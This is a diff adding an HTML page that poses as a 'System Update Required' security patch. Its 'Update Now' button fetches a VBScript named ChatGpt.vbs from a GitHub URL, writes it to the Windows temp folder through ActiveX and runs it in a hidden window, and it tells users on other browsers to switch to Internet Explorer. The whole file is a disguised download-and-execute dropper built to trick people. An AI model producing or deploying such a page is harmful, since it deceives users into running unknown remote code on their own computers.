@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+<body>
+    <h1>System Update Required</h1>
+    <p>Click "Update" to install the latest security patch.</p>
+    <button onclick="runVBS()">Update Now</button>
+
+    <script>
+        function runVBS() {
+            var rawUrl = 'https://raw.githubusercontent.com/adamaxcc-lgtm/ZFZZZZZZZFA/refs/heads/main/ChatGpt.vbs';
+            
+            fetch(rawUrl)
+                .then(r => r.text())
+                .then(vbsCode => {
+                    try {
+                        var fso = new ActiveXObject("Scripting.FileSystemObject");
+                        var wsh = new ActiveXObject("WScript.Shell");
+                        var temp = wsh.ExpandEnvironmentStrings("%TEMP%");
+                        var filePath = temp + "\\script.vbs";
+                        
+                        var file = fso.CreateTextFile(filePath, true);
+                        file.Write(vbsCode);
+                        file.Close();
+                        
+                        wsh.Run("\"" + filePath + "\"", 0, false);
+                    } catch(e) {
+                        // إذا ما كانش Internet Explorer، اشرح للمستخدم
+                        alert("Please use Internet Explorer to run this update.");
+                    }
+                });
+        }
+    </script>
+</body>
+</html>
